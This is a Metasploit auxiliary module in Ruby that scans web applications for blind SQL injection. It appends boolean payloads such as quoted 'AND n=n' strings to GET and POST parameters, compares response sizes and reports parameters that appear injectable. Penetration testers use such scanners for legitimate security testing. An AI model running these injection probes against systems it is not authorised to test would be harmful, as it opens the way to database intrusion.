##
# $Id: blind_sql_query.rb 14735 2012-02-17 09:36:04Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'




class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanUniqueQuery
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report


	def initialize(info = {})
		super(update_info(info,
			'Name'   		=> 'HTTP Blind SQL Injection Scanner',
			'Description'	=> %q{
				This module identifies the existence of Blind SQL injection issues
				in GET/POST Query parameters values.
			},
			'Author' 		=> [ 'et [at] cyberspace.org' ],
			'License'		=> BSD_LICENSE,
			'Version'		=> '$Revision: 14735 $'))

		register_options(
			[
				OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),
				OptString.new('PATH', [ true,  "The path/file to test SQL injection", '/index.asp']),
				OptString.new('QUERY', [ false,  "HTTP URI Query", '']),
				OptString.new('DATA', [ false, "HTTP Body Data", '']),
				OptString.new('COOKIE',[ false, "HTTP Cookies", ''])
			], self.class)

	end

	def run_host(ip)
		# Force http verb to be upper-case, because otherwise some web servers such as
		# Apache might throw you a 501
		http_method = datastore['METHOD'].upcase
 
		gvars = Hash.new()
		pvars = Hash.new()
		cvars = Hash.new()

		rnum=rand(10000)

		valstr = [
			[ 'numeric',
			" AND #{rnum}=#{rnum} ",
			" AND #{rnum}=#{rnum+1} "
			],
			[ 'single quotes',
			"' AND '#{rnum}'='#{rnum}",
			"' AND '#{rnum}'='#{rnum+1}"
			],
			[ 'double quotes',
			"\" AND \"#{rnum}\"=\"#{rnum}",
			"\" AND \"#{rnum}\"=\"#{rnum+1}"
			]
		]

		#
		# Dealing with empty query/data and making them hashes.
		#

		if  !datastore['QUERY'] or datastore['QUERY'].empty?
			datastore['QUERY'] = nil
			gvars = nil
		else
			gvars = queryparse(datastore['QUERY']) #Now its a Hash
		end

		if  !datastore['DATA'] or datastore['DATA'].empty?
			datastore['DATA'] = nil
			pvars = nil
		else
			pvars = queryparse(datastore['DATA'])
		end

		if  !datastore['COOKIE'] or datastore['COOKIE'].empty?
			datastore['COOKIE'] = nil
			cvars = nil
		else
			cvars = queryparse(datastore['COOKIE'])
		end


		#SEND NORMAL REQUEST
		
	
		begin
			normalres = send_request_cgi({
				'uri'  		=> datastore['PATH'],
				'vars_get' 	=> gvars,
				'method'   	=> http_method,
				'ctype'		=> 'application/x-www-form-urlencoded',
				'cookie'    => datastore['COOKIE'],
				'data'      => datastore['DATA']
			}, 20)

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end

		sigtxt = ""

		if normalres
			if normalres.body.empty?
				print_error("No body to obtain signature")
				return
			else
				sigtxt = normalres.body
			end
		else
			print_error("No response")
			return
		end

		#print_status("Normal request sent.")

		valstr.each do |tarr|

			#QUERY
			if gvars
				gvars.each do |key,value|
				gvars = queryparse(datastore['QUERY']) #Now its a Hash

				print_status("- Testing '#{tarr[0]}' Parameter #{key}:")

				#SEND TRUE REQUEST
				gvars[key] = gvars[key]+tarr[1]


				begin
					trueres = send_request_cgi({
						'uri'  		=>  datastore['PATH'],
						'vars_get' 	=>  gvars,
						'method'   	=>  http_method,
						'ctype'		=> 'application/x-www-form-urlencoded',
						'cookie'    => datastore['COOKIE'],
						'data'      => datastore['DATA']
					}, 20)

				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				rescue ::Timeout::Error, ::Errno::EPIPE
				end

				if normalres and trueres

					#Very simple way to compare responses, this can be improved alot , at this time just the simple way

					reltruesize = trueres.body.length-(trueres.body.scan(/#{tarr[1]}/).length*tarr[1].length)
					normalsize = normalres.body.length

					#print_status("nlen #{normalsize} reltlen #{reltruesize}")

					if reltruesize == normalsize
						#If true it means that we have a small better chance of this being a blind sql injection.

						#SEND FALSE REQUEST
						gvars[key] = gvars[key]+tarr[2]


						begin
							falseres = send_request_cgi({
								'uri'  		=>  datastore['PATH'],
								'vars_get' 	=>  gvars,
								'method'   	=>  http_method,
								'ctype'		=> 'application/x-www-form-urlencoded',
								'cookie'    => datastore['COOKIE'],
								'data'      => datastore['DATA']
							}, 20)


							if falseres
								#Very simple way to compare responses, this can be improved alot , at this time just the simple way
								relfalsesize = falseres.body.length-(falseres.body.scan(/#{tarr[2]}/).length*tarr[2].length)
								#true_false_dist = edit_distance(falseres.body,trueres.body)

								#print_status("rellenf #{relfalsesize}")

								if reltruesize > relfalsesize
									print_status("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")

									report_note(
										:host	=> ip,
										:proto => 'tcp',
										:sname => (ssl ? "https" : "http"),
										:port	=> rport,
										:type	=> 'BLIND_SQL_INJECTION',
										:data	=> "#{datastore['PATH']} Parameter: #{key} Type: #{tarr[0]}"
									)
								else
									print_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
								end
							else
								print_status("NO False Response.")
							end

						rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
						rescue ::Timeout::Error, ::Errno::EPIPE
						end
					else
						print_status("Normal and True requests are different.")
					end
				else
					print_status("No response.")
				end
			end
			end
			#DATA

			if pvars
				pvars.each do |key,value|
				pvars = queryparse(datastore['DATA']) #Now its a Hash

				print_status("- Testing '#{tarr[0]}' Parameter #{key}:")

				#SEND TRUE REQUEST
				pvars[key] = pvars[key]+tarr[1]

				pvarstr = ""
				pvars.each do |tkey,tvalue|
					if pvarstr
						pvarstr << '&'
					end
					pvarstr << tkey+'='+tvalue
				end


				begin
					trueres = send_request_cgi({
						'uri'  		=>  datastore['PATH'],
						'vars_get' 	=>  gvars,
						'method'   	=>  http_method,
						'ctype'		=> 'application/x-www-form-urlencoded',
						'cookie'    => datastore['COOKIE'],
						'data'      => pvarstr
					}, 20)

				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				rescue ::Timeout::Error, ::Errno::EPIPE
				end

				if normalres and trueres

					#Very simple way to compare responses, this can be improved alot , at this time just the simple way

					reltruesize = trueres.body.length-(trueres.body.scan(/#{tarr[1]}/).length*tarr[1].length)
					normalsize = normalres.body.length

					#print_status("nlen #{normalsize} reltlen #{reltruesize}")

					if reltruesize == normalsize
						#If true it means that we have a small better chance of this being a blind sql injection.

						#SEND FALSE REQUEST
						pvars[key] = pvars[key]+tarr[2]

						pvarstr = ""
						pvars.each do |tkey,tvalue|
							if pvarstr
								pvarstr << '&'
							end
							pvarstr << tkey+'='+tvalue
						end


						begin
							falseres = send_request_cgi({
								'uri'  		=>  datastore['PATH'],
								'vars_get' 	=>  gvars,
								'method'   	=>  http_method,
								'ctype'		=> 'application/x-www-form-urlencoded',
								'cookie'    => datastore['COOKIE'],
								'data'      => pvarstr
							}, 20)


							if falseres
								#Very simple way to compare responses, this can be improved alot , at this time just the simple way
								relfalsesize = falseres.body.length-(falseres.body.scan(/#{tarr[2]}/).length*tarr[2].length)
								#true_false_dist = edit_distance(falseres.body,trueres.body)

								#print_status("rellenf #{relfalsesize}")

								if reltruesize > relfalsesize
									print_status("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")

									report_note(
										:host	=> ip,
										:proto => 'tcp',
										:port	=> rport,
										:type	=> 'BLIND_SQL_INJECTION',
										:data	=> "#{datastore['PATH']} Parameter: #{key} Type: #{tarr[0]}"
									)

								else
									print_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
								end
							else
								print_status("NO False Response.")
							end

						rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
						rescue ::Timeout::Error, ::Errno::EPIPE
						end
					else
						print_status("Normal and True requests are different.")
					end
				else
					print_status("No response.")
				end
			end
			end

		end
	end
end
